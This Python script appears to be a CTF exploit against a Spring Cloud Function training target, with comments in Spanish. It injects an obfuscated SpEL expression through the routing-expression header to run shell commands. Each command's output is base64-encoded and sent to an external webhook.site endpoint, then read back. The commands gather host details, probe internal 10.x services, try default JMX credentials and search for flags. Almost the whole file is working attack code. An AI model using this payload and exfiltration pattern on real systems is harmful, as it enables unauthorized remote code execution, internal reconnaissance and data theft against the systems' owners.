#!/usr/bin/env python3
"""
CTF Chile - Test directo de documentación de servicios internos
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32785"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook...")
try:
    uuid_resp = requests.post("https://webhook.site/token", timeout=10)
    UUID = uuid_resp.json()["uuid"]
    WH = "https://webhook.site/" + UUID
    print(f"    Webhook: https://webhook.site/#!/{UUID}")
except Exception as e:
    print(f"[!] Error webhook: {e}")
    exit(1)

def test_cmd(cmd, tag):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?data=X'"
    payload = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'

    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": payload,
            "Content-Type": "text/plain",
        }, data="x", timeout=20)
        print(f"[{r.status_code}] {tag}")
        return r.status_code == 500
    except Exception as e:
        print(f"[ERR] {tag}: {e}")
        return False

print("\n[TEST 1] Verificar conectividad básica")
test_cmd("whoami && hostname", "basic_info")

print("\n[TEST 2] Buscar servicios internos")
test_cmd("curl -s -I http://10.160.209.1:8000/docs | head -3", "docs_service1")
test_cmd("curl -s -I http://10.109.220.1:8000/docs | head -3", "docs_service2")

print("\n[TEST 3] Probar autenticación JMX")
test_cmd("curl -s -u monitorRole:QED http://10.160.209.1:8000/execute", "auth_test1")
test_cmd("curl -s -u monitorRole:QED http://10.109.220.1:8000/execute", "auth_test2")

print("\n[TEST 4] Buscar contenido de docs específico")
test_cmd("curl -s http://10.160.209.1:8000/docs | grep -o 'ctfchile{[^}]*}' || echo 'NO_FLAG'", "flag_search1")
test_cmd("curl -s http://10.109.220.1:8000/docs | grep -o 'ctfchile{[^}]*}' || echo 'NO_FLAG'", "flag_search2")

print("\n⏰ Esperando resultados...")
time.sleep(10)

print("\n[RESULTADOS]")
try:
    r = requests.get(f"https://webhook.site/token/{UUID}/requests", timeout=20)
    data = r.json().get("data", [])

    for i, req in enumerate(data[:10]):
        url = req.get("url", "")
        tag = url.split(UUID)[-1].split("?")[0].lstrip("/")
        query = req.get("query", {})
        raw_data = query.get("data", "")

        if isinstance(raw_data, list):
            raw_data = raw_data[0] if raw_data else ""

        print(f"\n[{i+1}] {tag}")
        if raw_data:
            try:
                decoded = base64.b64decode(raw_data).decode("utf-8", "replace")
                print(f"    {decoded[:150]}...")
                if "ctfchile{" in decoded.lower():
                    print("    🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")
                    print(f"    {decoded}")
            except:
                print(f"    RAW: {raw_data[:100]}...")
        else:
            print("    (sin datos)")

except Exception as e:
    print(f"[!] Error obteniendo resultados: {e}")

print(f"\n🔗 Revisar manualmente: https://webhook.site/#!/{UUID}")
print("="*50)